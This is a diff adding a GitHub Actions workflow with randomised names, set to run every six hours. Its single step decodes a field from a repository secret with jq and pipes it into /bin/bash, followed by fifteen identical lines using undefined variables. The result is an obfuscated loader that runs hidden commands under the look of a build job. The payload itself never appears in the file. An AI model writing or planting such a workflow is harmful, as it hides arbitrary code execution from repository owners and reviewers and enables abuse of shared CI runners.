@@ -1,0 +1,32 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          se347: ${{ secrets.se347 }}
+        run: |
+          echo $se347 | jq -r .mv3 | /bin/bash
+          echo $zin4287 | jq -r .we263 | /bin/bash
+          echo $p55 | jq -r .vmsmb504 | /bin/bash
+          echo $qhsay2 | jq -r .nvjh296 | /bin/bash
+          echo $mab31 | jq -r .jmt2 | /bin/bash
+          echo $unc9913 | jq -r .ujpem61 | /bin/bash
+          echo $gz76 | jq -r .cxx801 | /bin/bash
+          echo $ggrsv4 | jq -r .gmit0886 | /bin/bash
+          echo $czem56 | jq -r .gsok0 | /bin/bash
+          echo $gblkt001 | jq -r .asux26340 | /bin/bash
+          echo $sn93429 | jq -r .qnm566 | /bin/bash
+          echo $rl975 | jq -r .zw665 | /bin/bash
+          echo $ug2 | jq -r .nbh16 | /bin/bash
+          echo $wo65 | jq -r .yl84 | /bin/bash
+          echo $c98 | jq -r .x5 | /bin/bash
+          echo $pmo05 | jq -r .f021 | /bin/bash
+
